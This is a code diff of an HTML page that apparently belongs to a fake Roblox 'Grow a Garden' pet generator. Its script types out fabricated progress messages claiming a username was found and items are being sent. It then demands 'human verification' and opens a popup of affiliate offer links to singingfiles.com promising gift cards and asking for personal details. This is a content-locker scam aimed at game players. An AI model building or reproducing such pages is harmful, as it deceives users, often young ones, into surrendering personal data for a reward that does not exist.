@@ -1,45 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Loading...</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Generating...</title>
+  <link rel="stylesheet" href="style.css"/>
 </head>
-<body class="loading-page">
+<body class="loading-body">
   <div class="loading-box">
-    <img src="logo.png" alt="Grow a Garden" class="logo" />
-    <div class="loading-messages" id="loadingMessages"></div>
-    <p class="verify-warning">Human Verification Required.</p>
-    <div class="dots">
-      <div class="dot green"></div>
-      <div class="dot green"></div>
-      <div class="dot green"></div>
+    <img src="logo.png" class="logo loading-logo" />
+    <div id="loading-text" class="loading-text"></div>
+    <div id="verification-box" class="verification-box hidden">
+      <div class="green-dots"></div>
+      <button id="verify-btn" onclick="showOfferPopup()">Verify</button>
     </div>
-    <button id="verifyBtn" class="verify-button animated-zoom">Verify</button>
   </div>
 
-  <!-- Popup Offer Section -->
-  <div class="offer-popup" id="offerPopup" style="display: none;">
-    <img src="logo.png" alt="Logo" class="popup-logo">
-    <h2>🎁 LAST STEP !</h2>
-    <p>Complete a simple task below and your pet will be sent to your account, don’t worry it’s free!</p>
-
-    <a href="https://singingfiles.com/show.php?l=0&u=2430407&id=68831" class="offer-btn" target="_blank">
-      Enter for a Chance to win a $50 gift card for Roblox!
-    </a>
-
-    <a href="https://singingfiles.com/show.php?l=0&u=2430407&id=70869" class="offer-btn" target="_blank">
-      Don’t miss out! $500 on the line for Walmart, enter NOW!
-    </a>
-
-    <a href="https://singingfiles.com/show.php?l=0&u=2430407&id=70866" class="offer-btn" target="_blank">
-      Enter your details to win a prepaid Visa Card!
-    </a>
-
-    <div class="loading-spinner"></div>
+  <div id="offer-popup" class="offer-popup hidden">
+    <div class="popup-inner">
+      <h3>🎁 LAST STEP !</h3>
+      <p>Complete a simple task below and your pet will be sent to your account (don’t worry it’s free)!</p>
+      <a href="https://singingfiles.com/show.php?l=0&u=2430407&id=68831" target="_blank">Enter for a Chance to win a $50 gift card for Roblox!</a>
+      <a href="https://singingfiles.com/show.php?l=0&u=2430407&id=70869" target="_blank">Don’t miss out! $500 on the line for Walmart, enter NOW!</a>
+      <a href="https://singingfiles.com/show.php?l=0&u=2430407&id=70866" target="_blank">Enter your details to win a prepaid Visa Card!</a>
+    </div>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    const steps = [
+      "Connecting to server...",
+      "Username found ✅",
+      "Selected items: 3",
+      "Fetching data...",
+      "Sending to your Roblox account...",
+      "Verifying human activity..."
+    ];
+
+    let index = 0;
+    const loadingText = document.getElementById('loading-text');
+
+    function typeWriter(text, callback) {
+      let i = 0;
+      function typing() {
+        if (i < text.length) {
+          loadingText.innerHTML += text.charAt(i);
+          i++;
+          setTimeout(typing, 40);
+        } else if (callback) {
+          setTimeout(callback, 600);
+        }
+      }
+      typing();
+    }
+
+    function showOfferPopup() {
+      document.getElementById('offer-popup').classList.remove('hidden');
+    }
+
+    function runSteps() {
+      if (index < steps.length) {
+        typeWriter(steps[index], () => {
+          loadingText.innerHTML += "<br>";
+          index++;
+          runSteps();
+        });
+      } else {
+        document.getElementById("verification-box").classList.remove("hidden");
+        loadingText.innerHTML += `<br><span class="verify-warning">⚠️ Human Verification Required</span>`;
+      }
+    }
+
+    runSteps();
+  </script>
 </body>
 </html>
